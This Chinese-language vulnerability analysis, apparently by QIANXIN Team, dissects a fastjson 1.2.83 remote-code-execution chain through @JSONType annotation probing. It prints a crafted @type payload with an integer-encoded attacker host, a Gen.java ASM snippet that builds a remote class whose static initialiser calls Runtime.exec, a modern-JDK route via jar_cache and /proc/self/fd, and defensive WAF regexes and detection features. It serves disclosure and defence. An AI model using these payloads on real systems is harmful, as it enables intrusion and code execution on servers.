# 从 checkAutoType 到 defineClass：fastjson 1.2.83 @JSONType 注解探测链的完整逆向与利用
> QIANXIN Team
> 来源：https://forum.butian.net/share/4992

## 一、引子

过去七年，fastjson 反序列化漏洞的利用范式高度一致：

1.  绕过黑名单（`denyList`）找到一个危险类
2.  构造 JSON payload 触发 `@type` 解析
3.  依赖经典 gadget（`JdbcRowSetImpl` / `TemplatesImpl`）完成 JNDI 注入或字节码加载

这条新链打破了所有惯例：

-   **不需要打开 AutoType**：利用点在 `checkAutoType` 的注解探测逻辑
-   **不需要经典 gadget**：payload 是一个自定义的远程 class（`jar:http://...`）
-   **不依赖传统 gadget 的二次调用**：class 在后续实例化或首次主动使用时完成初始化，触发 `<clinit>`
-   **类型绑定 `parseObject(body, Dto.class)` 无法防御**

笔者的第一反应是"这怎么可能"。直到读完 `ParserConfig.checkAutoType` 的每一行代码。

* * *

## 二、`checkAutoType` 的五个攻击阶段

`com.alibaba.fastjson.parser.ParserConfig.checkAutoType(String typeName, Class<?> expectClass, int features)` 是 fastjson 处理 `@type` 的核心入口。无论 `JSON.parse(body)` 还是 `JSON.parseObject(body, SomeClass.class)`，最终都会走到这里。

关键代码段（fastjson 1.2.83）：

```java

if (autoTypeSupport || expectClassFlag) {
    
}


boolean jsonType = false;
InputStream is = null;
try {
    String resource = typeName.replace('.', '/') + ".class";   
    if (defaultClassLoader != null) {
        is = defaultClassLoader.getResourceAsStream(resource);  
    } else {
        is = ParserConfig.class.getClassLoader()
                .getResourceAsStream(resource);
    }
    if (is != null) {
        ClassReader classReader = new ClassReader(is, true);
        TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
        classReader.accept(visitor);
        jsonType = visitor.hasJsonType();                       
    }
} catch (Exception e) {
    
} finally {
    IOUtils.close(is);
}


if (autoTypeSupport || jsonType || expectClassFlag) {
    boolean cacheClass = autoTypeSupport || jsonType;
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass); 
}


if (clazz != null) {
    if (jsonType) {
        if (autoTypeSupport) {
            TypeUtils.addMapping(typeName, clazz);
        }
        return clazz;   
    }
    
    
}
```

### 2.1 攻击面一：`typeName.replace('.', '/')` — 字符串转换即 sink

`typeName` 来自 JSON 中的 `@type` 字段值，完全由攻击者控制。`replace('.', '/')` 的语义是"将 Java 全限定类名转换为 classpath 资源路径"。但当 `typeName` 不是类名而是一个 URL 时，这个操作就变成了 URL 构造。

关键技巧——攻击者用 `..` 表示 `//`，因为 `..` 中每个 `.` 会被替换为 `/`：

```php
输入 typeName:  jar:http:..2130706433:18080.probe!.POC
     ↓ replace('.', '/')
输出 resource:   jar:http:
```

`2130706433` = `127.0.0.1` 的 32 位无符号整数表示。整数 IP 必须用于绕过 dotted hostname 因为 hostname 中的 `.` 也会被变成 `/`。

### 2.2 攻击面二：`classLoader.getResourceAsStream()` — 取决于 ClassLoader 实现

这是整条链最关键的分叉点。`getResourceAsStream()` 能否将上面的 URL 解析为远程资源，完全取决于 `defaultClassLoader` 的具体类型：

|  |  |  |
| --- | --- | --- |
| ClassLoader 类型 | 行为 | 结果 |
| JDK AppClassLoader | 通常只搜索 classpath 中的 jar/目录 | 一般返回 null，链断 |
| 独立 WAR 场景中的 Tomcat WebappClassLoader | 通常搜索 WEB-INF/lib 和 WEB-INF/classes | 一般返回 null，链断 |
| Spring Boot fat-jar 启动 ClassLoader（2.x 的 LaunchedURLClassLoader、3.x 的对应实现） | 特定版本可把构造后的绝对资源名按 http: / jar: / file: URL 处理 | 可能远程取回 class/JAR，链继续 |

这里必须区分“独立 Tomcat 的 `WebappClassLoader`”与“Spring Boot 内嵌 Tomcat”。后者的应用类通常由 Spring Boot 启动 ClassLoader 管理，因此长亭报告中内嵌 Tomcat、Jetty、Undertow 均可受影响并不矛盾；决定性因素是**实际承接 fastjson 资源查找与类加载的 ClassLoader**，而不是内嵌容器品牌本身。

此处 `is != null` 意味着攻击者的远程 class 字节码已经被加载到内存，等待下一步的 ASM 分析。

### 2.3 攻击面三：ASM 字节码探针 — `@JSONType` 即通行证

```java
ClassReader classReader = new ClassReader(is, true);
TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
classReader.accept(visitor);
jsonType = visitor.hasJsonType();
```

这段代码用 ASM 扫描攻击者提供的 class 字节码，检查是否包含 `@com.alibaba.fastjson.annotation.JSONType` 注解。**它只做注解检查，不验证类的合法性、不检查类名、不限制类的来源**。只要注解存在，`jsonType` 就设为 `true`。

这个设计本意是性能优化——通过注解快速判断一个类是否被 fastjson 管理。问题是它**没有验证字节码来源**。攻击者提供的远程 class 只要加上 `@JSONType` 注解，就能通过这道门。

### 2.4 攻击面四：`TypeUtils.loadClass()` — 从字节码到 defined class

```java
if (autoTypeSupport || jsonType || expectClassFlag) {
    boolean cacheClass = autoTypeSupport || jsonType;
    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
}
```

`jsonType == true` 时，即使 `autoTypeSupport == false`，也会进入 `loadClass`。`TypeUtils.loadClass()` 会依次尝试显式 ClassLoader、线程上下文 ClassLoader 和 `Class.forName()`；JDK 8 的公开短链可直接使用构造后的 `http:` / `jar:http:` 类型名，现代 JDK 的替代链还会使用 `jar:file:` 重新打开已缓存的远程 JAR。

此时攻击者的 class 会进入 JVM 的加载/定义流程。需要注意：**`defineClass` 本身只完成类定义，并不保证立即执行 `<clinit>`**；类初始化通常由 `Class.forName()` 的初始化语义，或 fastjson 后续实例化、首次主动使用该类时触发。对利用结果而言仍可在同一次解析请求中执行代码，但不应把“定义类”和“初始化类”写成同一个 JVM 阶段。

### 2.5 攻击面五：短路跳过所有安全检查

```java
if (jsonType) {
    if (autoTypeSupport) {
        TypeUtils.addMapping(typeName, clazz);
    }
    return clazz;  
}
```

`jsonType == true` 的 `return clazz` 跳过了：

-   `ClassLoader` / `DataSource` / `RowSet` 的硬编码拦截
-   `denyList` 黑名单检查
-   `expectClass.isAssignableFrom(clazz)` 类型兼容性检查

这就是为什么 `parseObject(body, Dto.class)` 也无法防御——class 的加载和初始化发生在类型绑定之前。

* * *

## 三、payload 构造：JDK 8 直接短链的 Gen.java 示例

下面的 `Gen.java` 展示的是 JDK 8 直接远程 class 短链。现代 JDK 的完整链还需要为远程 JAR 缓存和不同 FD 候选生成对应入口 class，不应把这个单 class 示例视为 JDK 17+ 的完整 payload。该短链中的 class 需要满足三个条件：

1.  携带 `@JSONType` 注解（通过 ASM probe）
2.  内部名等于该短链使用的 `jar:http://...` URL
3.  `<clinit>` 执行攻击逻辑（在类初始化时触发）

`Gen.java` 使用 ASM `ClassWriter` 直接构造字节码：

```java

String internalName = "jar:http://attacker:8000/probe!/POC";
ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC,
        internalName, null, "java/lang/Object", null);


cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true)
  .visitEnd();


MethodVisitor m = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>",
        "()V", null, null);
m.visitCode();

m.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime",
        "getRuntime", "()Ljava/lang/Runtime;", false);

m.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime",
        "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
m.visitInsn(Opcodes.RETURN);
```

JDK 版本影响的是**具体利用路径**，不能直接等同于是否可 RCE：

-   **JDK 8**：已公开的短链可以直接加载 `http:..` / `jar:http:..` 对应的远程 class，实现 RCE。
-   **现代 JDK（公开验证覆盖 JDK 17 / 21 / 25）**：上述短链确实会因类名格式校验抛出 `ClassFormatError: Illegal class name`，但这只说明**短链失效**。公开技术分析展示了替代路径：先用 `jar:http:` 促使 JVM 下载远程 JAR 并生成 `jar_cache*` 临时缓存，再通过 Linux 的 `/proc/self/fd/N` 或 macOS 的 `/dev/fd/N` 以 `jar:file:` 重新打开该缓存，使用满足现代 JVM 类名校验的内部名完成 RCE。
-   -   \*

## 四、已验证的利用窗口与边界

本文分析对象是 fastjson 1.2.83；原始披露确认的测试范围为 1.2.68–1.2.83，更早版本是否具备完全相同的端到端条件应单独验证。当前公开验证可概括为：

| 已验证/报告的环境 | 结果 | 关键边界 |
| --- | --- | --- |
| Spring Boot fat-jar + JDK 8 | RCE | 可走直接远程 class 短链 |
| Spring Boot fat-jar + JDK 17 / 21 / 25 + Linux | RCE | 可走远程 JAR 缓存与 /proc/self/fd 重开链 |
| Spring Boot fat-jar + JDK 17 / 21 / 25 + macOS | RCE | 可使用 /dev/fd 等价路径 |
| Windows + 高版本 JDK | 当前报告中的现代 JDK 链未成功 | 不能据此推导组件已修复，只能说明该利用路径受限 |
| 无法解析绝对 URL 资源名的普通 ClassLoader，或 JVM 无必要出网能力 | 链断 | 与 JDK 主版本无关 |

所以，根据全网三方资料的验证，更准确的交集是：**受影响的 fastjson、未启用 SafeMode、攻击者可控的 `@type`、能够处理构造资源名的实际 ClassLoader，以及可达的出站网络**；现代 JDK 链还需要对应操作系统提供可利用的文件描述符重开路径。

> 核对来源：[长亭安全应急响应中心二次更新](https://mp.weixin.qq.com/s/ngrBwRPtFzM4G3A_P9SCog)给出了 JDK 8 / 17 / 21 / 25 与操作系统差异的复现结论；[公开技术分析](https://www.gcsa.org/media/fastjson-1-2-83-gadget-free-rce)说明了现代 JDK 上远程 JAR 缓存与 FD 重开链。原始披露确认的版本测试范围见 [Kirill Firsov 的披露线程](https://x.com/k_firsov/status/2078872293745570032)。

## 五、防御体系：从单点到纵深

### 5.1 代码层：优先启用 `safeMode`

```bash
-Dfastjson.parser.safeMode=true
```

在未注册自定义检查器的常规路径中，`safeMode` 会在资源访问和注解探测之前终止 `@type` 处理，是首选临时缓解措施。需要额外审计 `AutoTypeCheckHandler`：fastjson 1.2.83 源码中该 handler 的调用位于 SafeMode 检查之前。长期方案仍应是迁移至 fastjson2，并完成兼容性回归。

### 5.2 ClassLoader 层：审计实际资源查找与类加载链

`defaultClassLoader` 不是唯一入口：未显式设置时，资源探测会回退到 `ParserConfig.class.getClassLoader()`；`TypeUtils.loadClass()` 还会继续尝试线程上下文 ClassLoader 和 `Class.forName()`。因此应审计实际运行时链路，而不是只搜索 `setDefaultClassLoader()` 调用：

-   不让承接不可信 JSON 解析的 ClassLoader 将构造后的绝对 `http:` / `jar:` / `file:` 资源名当作合法 classpath 资源
-   核对 Spring Boot 启动方式、线程上下文 ClassLoader 和自定义 ClassLoader；不要因代码未调用 `setDefaultClassLoader()` 就判定不受影响

### 5.3 网络与运行时层：采用出站白名单

不要只按 `jar:http`、端口或 `User-Agent: Java` 做字符串拦截：JDK 8 短链可以使用直接 `http:` 资源，现代链还会组合 `jar:http:` 与本地 `jar:file:`。更可靠的方案是对业务 JVM/容器实施**默认拒绝的出站策略**，仅放行明确需要访问的域名、IP 和端口，并监控异常 `.class`/无扩展名 JAR 下载与 JVM 临时目录中的 `jar_cache*` 文件。

在现代 JDK 环境中，还可以把 `/proc/self/fd`、`/dev/fd` 暴露面和容器沙箱作为附加加固点，但这些措施都不应替代 SafeMode 或组件迁移。**升级 JDK 只能作为常规运行时加固，不能单独修复本漏洞。**

### 5.4 WAF / API 网关临时检测方案

不建议继续使用 `(jar:|2130706433|!)` 对 `@type` 的值做简单黑名单：单独匹配 `!` 容易误报，`2130706433` 只是众多主机表示之一，而且规则会漏掉直接 `http:..`、其他整数 IP/DNS 标签、`jar:file:` 以及混合转义形式。更稳妥的方案分两层：

#### 方案 A：业务不需要 `@type` 时，规范化后直接拒绝该键（推荐）

在能读取完整请求体的 WAF phase 2、API 网关插件或应用前置过滤器中：

1.  仅对实际进入 fastjson 的接口启用规则；
2.  先处理 `Content-Encoding`，必要时做 URL 解码，再按 fastjson 可接受的语法解析或规范化字段名；
3.  递归检查请求体、嵌套对象以及会被业务送入 fastjson 的 URL 参数；
4.  只要**解码后的键精确等于 `@type`**，就拒绝请求；解析失败时不要回退为放行。

```text
if request_reaches_fastjson(request):
    document = parse_or_reject(normalize_request(request))
    if contains_key_recursively(document, "@type"):
        return 403
```

原始请求体正则只能作为兜底。下面的 PCRE 思路同时覆盖双引号、单引号/未引号字段，以及逐字符混用明文、Unicode 和 fastjson `\xNN` 转义的 `@type`：

```regex
(?s)(?:^|[,{]\s*)(["']?)(?:@|\\u0040|\\x40)(?:t|\\u0074|\\x74)(?:y|\\u0079|\\x79)(?:p|\\u0070|\\x70)(?:e|\\u0065|\\x65)\1\s*:
```

该表达式应放在**已取得完整、解压后请求体**的处理阶段；直接在 Nginx rewrite 阶段读取 `$request_body` 可能拿不到完整 body。原始文本正则也无法正确理解所有字符串边界、重复键和多层编码，因此不能替代 JSON 解析后的键检查。

#### 方案 B：业务确实依赖 `@type` 时，按接口做精确白名单

不要用协议或字符黑名单，而应在规范化后将 `@type` 的值与该接口允许的完整类名集合做**精确匹配**；非字符串、未知类型、重复 `@type` 或任何编码后才落入白名单的异常形式均拒绝。`http:`、`jar:`、`file:`、`!`、`.proc.self.fd.`、`.dev.fd.` 和连续 FD 枚举可作为高置信告警特征，但不应成为唯一阻断条件。

WAF 只能覆盖大多数已知入口，是临时缓解，不替代 `safeMode`、出站限制和 fastjson2 迁移。

* * *

## 六、总结与反思

### 技术层面

这条链的本质是**将 fastjson 的注解探测机制转化为一个远程类加载器**。攻击者通过控制类名（`@type` 值），将原本用于 classpath 资源查找的 `getResourceAsStream()` 变成 SSRF 入口，再将 ASM 注解验证的"通过信号"转为绕过 `autoType` 的通行证，最终由 Spring Boot 的 URL 协议处理器完成远程类定义。

### 工程层面

测绘结果揭示了一个现实：**漏洞的存在不等于所有部署都能沿同一条链利用**。ClassLoader、出站网络和操作系统会改变利用路径；但不能再因目标使用 JDK 17+ 就把风险降为 SSRF。对 Spring Boot fat-jar 环境，应结合实际 ClassLoader、操作系统和网络策略做验证，而不是只看 JDK 主版本。

### 防御层面

单点防御（如仅关闭 autoType）是不够的。纵深防御需要覆盖：

-   配置层（`safeMode`）
-   ClassLoader 层（审计实际资源查找与类加载链）
-   网络层（默认拒绝出站，并监控异常 class/JAR 与 `jar_cache*`）
-   WAF 层（检测 payload 特征）
-   运行时层（持续升级 JDK，但不把升级 JDK 当作本漏洞修复）
